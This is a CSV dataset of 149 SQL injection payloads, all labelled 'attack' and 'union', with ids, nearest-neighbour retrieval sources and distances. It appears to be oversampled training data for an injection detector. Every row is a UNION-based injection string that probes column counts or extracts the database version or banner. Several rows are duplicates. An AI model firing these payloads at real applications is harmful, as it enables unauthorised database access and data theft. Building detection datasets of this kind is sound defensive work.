id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,union,"-9179""  )   union all select 7144,7144,7144,7144,7144,7144,7144,7144--",nearest_attack_euclidean,R000291,0.3976425367478146
SMOTE_000002,attack,union,"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",nearest_attack_euclidean,R000604,0.42931561215125885
SMOTE_000003,attack,union,"-2111' union all select 1061,1061,1061--",nearest_attack_euclidean,R000386,0.16424655430539106
SMOTE_000004,attack,union,"-3393""   )    )    union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",nearest_attack_euclidean,R000584,0.3354230733967613
SMOTE_000005,attack,union,"-5596'   )    )     )   union all select 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--",nearest_attack_euclidean,R000321,0.04271531611383698
SMOTE_000006,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000738,0.25508364244989123
SMOTE_000007,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000246,0.14254892746143408
SMOTE_000008,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null#",nearest_attack_euclidean,R000625,0.1464516478759482
SMOTE_000009,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000039,0.8402720785934716
SMOTE_000010,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000345,0.8334804148132101
SMOTE_000011,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000175,0.18806862678916714
SMOTE_000012,attack,union,"-7845' union all select 9574,9574,9574,9574,9574,9574#",nearest_attack_euclidean,R000292,0.05592851765339969
SMOTE_000013,attack,union,"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",nearest_attack_euclidean,R000719,0.04289388135945207
SMOTE_000014,attack,union,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",nearest_attack_euclidean,R000223,0.049446625142068094
SMOTE_000015,attack,union,"-7255' union all select 2127,2127,2127,2127,2127#",nearest_attack_euclidean,R000329,0.10766106692208802
SMOTE_000016,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000421,0.020889582169633786
SMOTE_000017,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000134,0.19915713652512823
SMOTE_000018,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000092,0.23558202704610678
SMOTE_000019,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R000579,0.5388979167871832
SMOTE_000020,attack,union,"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000642,0.4479177137746783
SMOTE_000021,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000016,0.0
SMOTE_000022,attack,union,"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",nearest_attack_euclidean,R000675,0.3176684097699661
SMOTE_000023,attack,union,"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",nearest_attack_euclidean,R000208,0.5972743181916615
SMOTE_000024,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000768,0.5146086476707402
SMOTE_000025,attack,union,"-9003""   )    )    union all select 9721,9721--",nearest_attack_euclidean,R000660,0.06276874123752464
SMOTE_000026,attack,union," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000044,0.31394792540456506
SMOTE_000027,attack,union,"-2899""   )    )    as uyoc where 8417  =  8417 union all select 8417,8417,8417,8417--",nearest_attack_euclidean,R000598,0.5914320859514945
SMOTE_000028,attack,union,"-9382'  )   union all select 4774,4774,4774,4774--",nearest_attack_euclidean,R000591,0.3849727818039837
SMOTE_000029,attack,union,"-2375 union all select 1573,1573,1573,1573#",nearest_attack_euclidean,R000283,0.1834862947571775
SMOTE_000030,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000702,0.19665841188942063
SMOTE_000031,attack,union,"-3794'  )   union all select 2485,2485,2485,2485,2485--",nearest_attack_euclidean,R000178,0.15595666968720012
SMOTE_000032,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000207,0.23630631806303912
SMOTE_000033,attack,union,"-8833'   )    )    union all select 3227,3227,3227,3227,3227--",nearest_attack_euclidean,R000426,0.027497090295425235
SMOTE_000034,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000047,0.2441331481564168
SMOTE_000035,attack,union," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000135,0.14949882316914084
SMOTE_000036,attack,union,"-8950""   )    )    as uahs where 2113  =  2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",nearest_attack_euclidean,R000194,0.1392003820227679
SMOTE_000037,attack,union,"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",nearest_attack_euclidean,R000762,0.44270494245301434
SMOTE_000038,attack,union,"-4127%' union all select 9558,9558,9558#",nearest_attack_euclidean,R000727,0.41841358864590134
SMOTE_000039,attack,union,"-3326'+  (  select xitp where 7621  =  7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",nearest_attack_euclidean,R000267,0.4688650111987931
SMOTE_000040,attack,union,"-2725"" union all select 3671,3671,3671,3671,3671#",nearest_attack_euclidean,R000582,0.22968426556280946
SMOTE_000041,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000533,0.7571335201174292
SMOTE_000042,attack,union,-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,nearest_attack_euclidean,R000388,0.3126735875702853
SMOTE_000043,attack,union,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",nearest_attack_euclidean,R000218,0.6143859639608967
SMOTE_000044,attack,union,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",nearest_attack_euclidean,R000282,0.34979908967406076
SMOTE_000045,attack,union,"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",nearest_attack_euclidean,R000579,0.5903040555504055
SMOTE_000046,attack,union,"-8982'+  (  select anyd where 5358  =  5358 union all select 5358,5358,5358,5358,5358,5358#",nearest_attack_euclidean,R000697,0.30394692685468816
SMOTE_000047,attack,union,"1""  )   as xsgx where 5239  =  5239 union all select null,null--",nearest_attack_euclidean,R000511,0.9242950623384978
SMOTE_000048,attack,union,"-2375 union all select 1573,1573,1573,1573#",nearest_attack_euclidean,R000283,0.2794922559834132
SMOTE_000049,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000761,0.21804423678057863
SMOTE_000050,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000092,0.9193027304667672
SMOTE_000051,attack,union," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000083,0.20300455796174033
SMOTE_000052,attack,union," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000054,0.7834267001066035
SMOTE_000053,attack,union,"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",nearest_attack_euclidean,R000226,0.005119649120210169
SMOTE_000054,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000429,0.039767205603015866
SMOTE_000055,attack,union,"-4934"" union all select 5119,5119,5119,5119,5119--",nearest_attack_euclidean,R000375,0.04465852427313868
SMOTE_000056,attack,union,"-3326'+  (  select xitp where 7621  =  7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",nearest_attack_euclidean,R000267,0.4668030476724364
SMOTE_000057,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000370,0.06583889656801656
SMOTE_000058,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000034,1.6025979544498372
SMOTE_000059,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000595,0.6126592553623313
SMOTE_000060,attack,union,"-1171' union all select 3958,3958,3958,3958,3958--",nearest_attack_euclidean,R000233,0.0729406579484758
SMOTE_000061,attack,union,"-1030"" where 2161  =  2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",nearest_attack_euclidean,R000269,0.30492034384786226
SMOTE_000062,attack,union," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000106,0.005301353395090278
SMOTE_000063,attack,union,"-3116   )    )    as jyiq where 3875  =  3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",nearest_attack_euclidean,R000705,0.011332161960400712
SMOTE_000064,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000134,0.004584913156333995
SMOTE_000065,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,0.257660667567777
SMOTE_000066,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R000431,0.17393766896536697
SMOTE_000067,attack,union,"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",nearest_attack_euclidean,R000504,0.9410537638280247
SMOTE_000068,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000351,0.4278816278731911
SMOTE_000069,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000091,0.24900869449676535
SMOTE_000070,attack,union,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",nearest_attack_euclidean,R000229,0.27124675419067806
SMOTE_000071,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000048,0.21284060494218113
SMOTE_000072,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000430,0.18150310429088176
SMOTE_000073,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000095,0.7001814445570795
SMOTE_000074,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000065,0.8677922117838638
SMOTE_000075,attack,union," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000043,0.0
SMOTE_000076,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000039,1.376658081818594
SMOTE_000077,attack,union," select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000039,0.0
SMOTE_000078,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000176,0.01306323931030177
SMOTE_000079,attack,union,"1""  )   as drrx where 8633  =  8633 union all select null,null,null--",nearest_attack_euclidean,R000418,0.2933177275463439
SMOTE_000080,attack,union,"-4406%' union all select 9599,9599,9599,9599#",nearest_attack_euclidean,R000558,0.5180487537686571
SMOTE_000081,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R000576,0.2148395044603316
SMOTE_000082,attack,union,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",nearest_attack_euclidean,R000288,0.039142787197338935
SMOTE_000083,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000489,0.2594470987458619
SMOTE_000084,attack,union,"-5360' where 8178  =  8178 union all select 8178,8178,8178--",nearest_attack_euclidean,R000616,0.20813067326533716
SMOTE_000085,attack,union,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000350,0.2957671079305918
SMOTE_000086,attack,union,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",nearest_attack_euclidean,R000302,0.46614066037242385
SMOTE_000087,attack,union," select * from users where id  =  1.<@$ union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000014,0.8247689242679951
SMOTE_000088,attack,union,"1'||  (  select 'akye' where 9242  =  9242 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000694,0.33757444061078434
SMOTE_000089,attack,union,"1'+  (  select 'xqpe' where 4020  =  4020 union all select null,null--",nearest_attack_euclidean,R000657,0.3485532372301542
SMOTE_000090,attack,union," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000036,0.23810873508437835
SMOTE_000091,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000297,0.21679258214860997
SMOTE_000092,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000047,0.0
SMOTE_000093,attack,union,"-8588' union all select 2135,2135--",nearest_attack_euclidean,R000347,0.11510500109362952
SMOTE_000094,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000595,0.34401204173181843
SMOTE_000095,attack,union,"1' in boolean mode  )   union all select null,null,null--",nearest_attack_euclidean,R000344,0.340423496744788
SMOTE_000096,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000308,0.06420099183781694
SMOTE_000097,attack,union,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",nearest_attack_euclidean,R000246,0.2292862381908535
SMOTE_000098,attack,union," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000134,0.20665351779653432
SMOTE_000099,attack,union,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",nearest_attack_euclidean,R000352,0.931480461549259
SMOTE_000100,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000169,0.26594381057082633
SMOTE_000101,attack,union,"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--",nearest_attack_euclidean,R000341,0.37294119106634893
SMOTE_000102,attack,union,"-2333' union all select 9714,9714,9714--",nearest_attack_euclidean,R000419,0.05724821837919722
SMOTE_000103,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000004,0.8844440622252501
SMOTE_000104,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000492,0.17240747274753734
SMOTE_000105,attack,union," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000103,1.041618508572652
SMOTE_000106,attack,union,"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",nearest_attack_euclidean,R000208,0.4207854066210943
SMOTE_000107,attack,union,"-3279"" union all select 8568,8568,8568,8568--",nearest_attack_euclidean,R000189,0.20377236613793218
SMOTE_000108,attack,union,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",nearest_attack_euclidean,R000362,0.15706529914883344
SMOTE_000109,attack,union,"-1687   )    )    as lnva where 8396  =  8396 union all select 8396,8396#",nearest_attack_euclidean,R000684,0.8347277523559298
SMOTE_000110,attack,union,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",nearest_attack_euclidean,R000228,0.20282865928505814
SMOTE_000111,attack,union,"1'||  (  select 'zqdn' where 6194  =  6194 union all select null,null,null,null--",nearest_attack_euclidean,R000711,0.050418203714120965
SMOTE_000112,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000222,0.25105737049538657
SMOTE_000113,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000600,1.2218519472817175
SMOTE_000114,attack,union," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",nearest_attack_euclidean,R000005,0.1162571209469732
SMOTE_000115,attack,union,"1""   )    )    as yfpl where 4820  =  4820 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000702,0.49104002982421857
SMOTE_000116,attack,union,"-7963'+  (  select 'kxzh' where 7039  =  7039 union all select 7039,7039,7039,7039,7039,7039--",nearest_attack_euclidean,R000766,0.22190653063567298
SMOTE_000117,attack,union,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",nearest_attack_euclidean,R000252,0.01686218150871673
SMOTE_000118,attack,union," select * from users where id  =  1 or 1#"". union select 'a',version  (    )   -- 1",nearest_attack_euclidean,R000016,0.0
SMOTE_000119,attack,union,"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",nearest_attack_euclidean,R000547,0.71429162951733
SMOTE_000120,attack,union,"-9904""   )    )    union all select 9080,9080,9080,9080,9080--",nearest_attack_euclidean,R000421,0.09408483033102674
SMOTE_000121,attack,union," select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",nearest_attack_euclidean,R000029,0.6722804023025386
SMOTE_000122,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000351,0.0122135345494616
SMOTE_000123,attack,union," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000068,0.34084451613715794
SMOTE_000124,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000676,0.5182473629824621
SMOTE_000125,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000180,0.033647075395330864
SMOTE_000126,attack,union," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000069,0.4589826644643117
SMOTE_000127,attack,union," select * from users where id  =  1 ||1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000009,0.05461090690597925
SMOTE_000128,attack,union," select * from users where id  =  1 *1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000015,0.006702070799501276
SMOTE_000129,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000307,0.2033592563992244
SMOTE_000130,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000498,0.07401433407245184
SMOTE_000131,attack,union,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",nearest_attack_euclidean,R000346,0.30028483355500424
SMOTE_000132,attack,union,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000180,0.3003721850930527
SMOTE_000133,attack,union,"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",nearest_attack_euclidean,R000549,0.3664620895699987
SMOTE_000134,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000239,0.7503374041198686
SMOTE_000135,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000161,0.19272334321406331
SMOTE_000136,attack,union,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",nearest_attack_euclidean,R000359,0.1623621501195313
SMOTE_000137,attack,union,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",nearest_attack_euclidean,R000327,0.9614905971079409
SMOTE_000138,attack,union,"-5169""   )    )    union all select 6198,6198,6198,6198--",nearest_attack_euclidean,R000655,0.24880295070422703
SMOTE_000139,attack,union,"-3368'   )    )    union all select 4913,4913,4913,4913,4913,4913,4913,4913,4913--",nearest_attack_euclidean,R000746,0.07532807760658929
SMOTE_000140,attack,union,"1' in boolean mode  )   union all select null,null,null,null#",nearest_attack_euclidean,R000498,0.13275793516111956
SMOTE_000141,attack,union,"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",nearest_attack_euclidean,R000574,0.2626038539437602
SMOTE_000142,attack,union,"-5205'   )    )    union all select 8592,8592,8592,8592,8592,8592--",nearest_attack_euclidean,R000364,0.23731722162622773
SMOTE_000143,attack,union,"-5169""   )    )    union all select 6198,6198,6198,6198--",nearest_attack_euclidean,R000655,0.16715900383845028
SMOTE_000144,attack,union,"-4571' union all select 3227,3227,3227,3227--",nearest_attack_euclidean,R000243,6.405372599367026e-05
SMOTE_000145,attack,union,"-9382'  )   union all select 4774,4774,4774,4774--",nearest_attack_euclidean,R000591,0.05740017760971694
SMOTE_000146,attack,union,"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000737,0.11636443170293849
SMOTE_000147,attack,union," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000065,0.4465278301261222
SMOTE_000148,attack,union," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000091,0.21801830912738912
SMOTE_000149,attack,union,"1'+  (  select ugvj where 2593  =  2593 union all select null,null,null,null,null#",nearest_attack_euclidean,R000502,0.5082069281073394
